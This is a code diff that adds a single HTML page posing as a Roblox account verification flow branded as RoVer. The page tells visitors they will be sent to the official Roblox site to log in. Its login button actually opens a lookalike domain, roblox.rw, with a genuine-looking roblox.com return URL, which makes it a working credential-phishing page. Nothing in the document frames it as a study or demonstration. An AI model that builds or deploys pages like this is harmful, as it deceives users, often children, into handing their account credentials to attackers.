@@ -1,0 +1,182 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Roblox Verification</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: #111116;
+    color: white;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.container {
+    background: #1c1c24;
+    padding: 45px;
+    border-radius: 14px;
+    width: 520px;
+    max-width: 100%;
+    min-height: 400px;
+    text-align: center;
+    border: 1px solid #30303b;
+
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.logo {
+    width: 55px;
+    height: 55px;
+    margin: 0 auto 25px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 42px;
+    font-weight: bold;
+    color: white;
+}
+
+h1 {
+    font-size: 25px;
+}
+
+p {
+    color: #aaaab5;
+    font-size: 15px;
+    line-height: 1.7;
+}
+
+button {
+    width: 100%;
+    padding: 16px;
+    background: #e84c63;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 15px;
+}
+
+button:hover {
+    background: #d83c55;
+}
+
+.hidden {
+    display: none;
+}
+
+.oauth-area {
+    margin-top: 25px;
+    padding: 25px;
+    background: #15151c;
+    border: 1px solid #30303b;
+    border-radius: 10px;
+    width: 100%;
+}
+
+#firstScreen,
+#secondScreen {
+    width: 100%;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">R</div>
+
+    <!-- FIRST SCREEN -->
+    <div id="firstScreen">
+
+        <h1>Verify your Roblox account</h1>
+
+        <p>Connect with RoVer</p>
+
+        <button onclick="showSecondScreen()">
+            Verify with Roblox
+        </button>
+
+    </div>
+
+    <!-- SECOND SCREEN -->
+    <div id="secondScreen" class="hidden">
+
+        <h1>Continue with Roblox</h1>
+
+        <p>
+            You will be redirected to the official
+            Roblox website to log in.
+        </p>
+
+        <div class="oauth-area">
+
+            <button onclick="startRobloxLogin()">
+                Verify with Roblox
+            </button>
+
+        </div>
+
+        <button onclick="showFirstScreen()">
+            Back
+        </button>
+
+    </div>
+
+</div>
+
+<script>
+
+function showSecondScreen() {
+
+    document.getElementById("firstScreen")
+        .classList.add("hidden");
+
+    document.getElementById("secondScreen")
+        .classList.remove("hidden");
+
+}
+
+function showFirstScreen() {
+
+    document.getElementById("secondScreen")
+        .classList.add("hidden");
+
+    document.getElementById("firstScreen")
+        .classList.remove("hidden");
+
+}
+
+function startRobloxLogin() {
+
+    window.open(
+        "https://www.roblox.rw/NewLogin2538?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F932345539056%2Fprofile",
+        "_blank",
+        "noopener,noreferrer"
+    );
+
+}
+
+</script>
+
+</body>
+</html>
